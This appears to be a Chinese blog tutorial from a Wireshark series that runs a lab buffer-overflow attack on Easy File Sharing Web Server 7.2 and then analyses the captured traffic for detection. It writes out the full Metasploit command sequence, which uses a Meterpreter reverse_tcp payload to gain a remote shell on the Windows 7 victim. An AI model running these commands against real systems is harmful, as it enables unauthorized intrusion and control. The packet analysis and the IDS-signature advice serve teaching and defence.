---
title: 【Wireshark 系列】缓冲区溢出攻击分析
date: 2020-07-05 20:25:09 
update: 2020-07-05 20:25:09
categories: 
- Web
- Wireshark
tags: 
- Wireshark
- kali
copyright: true

---

![Wireshark](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/Wireshark.jpg)

前面介绍了很多种攻击方式，但是它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，操作系统和应用程序的漏洞也是网络安全研究的重点。
缓冲区溢出是现在很典型的一种远程攻击方式，它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码。这些攻击方式大都要通过应用层的协议实现，所以本次课也会介绍应用层最为典型的协议 HTTP 。

<!-- more -->

# 缓冲区溢出攻击的相关理论

缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出进行攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，攻击者可以利用它执行非授权指令，甚至可以取得系统特权，进而执行各种操作。

考虑到目前大量的应用程序都使用了 B/S 结构，而这种结构正是使用 HTTP 协议进行通信的。

维基百科的定义是：
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。

> HTTP 协议下有一个 Host 字段，这个不是多余的，主要是虚拟化技术的发展，一台主机很可能对应多个域名。

# 模拟缓冲区溢出攻击

## 实验环境

> 笔者的 8GB 主机基本要把所有的进程关闭 :sob:

kali：192.168.93.144
Win7：192.168.93.155
Wireshark 监听端口 VNet8
文件共享软件 Easy File Sharing Web Server7.2

## 实验步骤

### 开启服务

在 Win 7 下运行 文件共享软件 Easy File Sharing Web Server7.2：
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image001.png)

开启服务之后，另一台主机 kali 是可以访问的：

![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image002.png)

### 缓冲区溢出攻击

在 kali 中执行 msfconsole 命令打开 Metasploit：
<img src="%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image003.png" style="zoom:80%;" />

Metasploit 是各种渗透模块的集成，先搜索一下没有没目标软件的渗透模块：
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image004.png)

我们不妨使用 2015 版的：
```shell
use exploit/windows/http/easyfilesharing_seh
```

然后进行攻击
1. 选择武器
   ```shell
   set payload windows/meterpreter/reverse_tcp
   ```

1. 自我定位
   ```shell
   set lhost 192.168.93.144
   ```

1. 目标定位
   ```shell
   set rhost 192.168.93.155
   set rport 80
   ```

1. 攻击
   发送大量数据，包括木马等，实现缓冲区溢出
   ```shell
   exploit
   ```
   ![image-20200705203002353](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203002353.png)

这个时候已经实现了对 Win7 的控制。

### 控制

接下来可以把 Win7 当做自己的主机进行控制：
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image006.png)

![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image007.png)

 

# 使用 Wireshark 分析缓冲区溢出攻击

## 判定攻击

如果我们怀疑自己中了缓冲区溢出攻击，可以进行如下分析：
分析 [Buffer_Overflow.pcapng](https://github.com/ZER0-Nu1L/Wireshark-Analysis/tree/master/Package/Buffer_Overflow.pcapng)：

先用显示过滤器过滤一下，只显示 http 相关的报文（客户端进行缓冲区溢出攻击的应用层协议）
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203021763.png)

首先 Wireshark 已经看出来这里是一个畸形的数据包。并且，HTTP 数据包进行了分片，这往往是字段内容过大导致的，也是实现缓冲区溢出攻击的必要条件之一。

我们可以用 TCP 在追踪流查看一下：
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png)

可以很明显地看出 GET 后面的内容是混乱的， 没有没有实际意义可言，并且有很长很长一大段全是字符。
这很显然是为了将软件的缓冲区填满。

 

## 一个疑点的分析

值得一提的是，如果你尝试在 Easy File Sharing Web Server 页面填写内容的时候，会发现自己输出长度是有限的，那怎么会导致溢出呢？
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image010.png)
这一点其实并不难理解，这个功能实现往往是前端页面对用户输入的限制。但是传输的时候没有限制，比如通过 Socket 编程传递这样过长的参数。
再补充一下，我们这里是用 Metasploit 中的模块实现对软件的攻击，也就意味着这个漏洞是公开知晓的。但是自己去挖漏洞的时候，就需要自己用诸如 Socket 编程的方式进行攻击。

所以这里的软件是有问题的，漏洞在于不检查接收的数据有多长，只是在前端做了输入限制。
当传出的数据大于 TCP 的缓冲区，就会复制到缓冲区的外面，通俗地讲就是指向下一条要执行指令的指针（PC）指针。导致之后执行的时候，不是执行下一条程序，而是执行下一个木马。
 

## 缓冲区大小

程序缓冲区有多大，这个是一个非常非常关键的问题，对不同的人都有非常重要的意义。
黑客知晓之后，就可以进行攻击了，在缓冲区之外的加上木马文件，构造缓冲区溢出攻击；
安全工作者知晓之后，可以进行木马识别和网络取证等。


而我们这里其实也可以看到：
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png)
<img src="%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image011.png" style="zoom:50%;" />

这个程序的缓冲区大小为：4061 bytes.

 

## 反向木马

按照木马客户端和服务端之间建立连接的方式的不同，可以将木马分为正向连接木马和反向连接木马。

正向连接木马的连接过程为：控制端首先发起通信连接的请求，然后木马被控制端响应并建立半连接，等控制端响应后，木马被控制端最终建立一个与控制端的通信连接。
正向木马其实是比较困难，黑客不知道哪些主机中了木马，而中了木马的主机等待着黑客连接它。

再加上由于动态IP、防火墙过滤技术、内网访问限制等因素的存在，阻挡了许多木马的交互，使得中了木马的计算机无法与控制端联系。这样，反向连接方式就显得非常必要。

进一步说，灰鸽子木马之后，常见的木马基本上都是反向木马。

其连接过程是：控制端首先打开端口进行监听，被控制端主动与控制端的监听端口进行连接。木马控制端发现被控制端请求之后给出提示，然后控制者开始对被控制端主机进行控制操作。

 

我们分析一下这里是不是反向木马。
这里的服务器 IP 是 192.168.93.155，所以先用一次显示过滤器：
ip.src == 192.168.93.155
看到有一个它主动发出的 SYN 请求：
![image-20200705203053290](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203053290.png)

去掉显示过滤器，可以看到服务器主动和另一台主机进行 TCP 三次握手：
![](%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image013.png)

所以这里攻击者使用的是反向木马。

## 应对措施
如果你使用的软件存在这样的漏洞，但你又不得不使用这个软件，可以这样应对：
把特征写入入侵检测的特征库里，比如我们这里的特征是： HTTP GET请求, 缓冲区长度为 4061 bytes…

# 参考资料

1. [正向连接](http://www.cnitpm.com/pm1/66204.html)
1. [反向连接](http://www.cnitpm.com/pm1/66205.html)
1. [缓冲区溢出](https://zh.wikipedia.org/wiki/缓冲区溢出)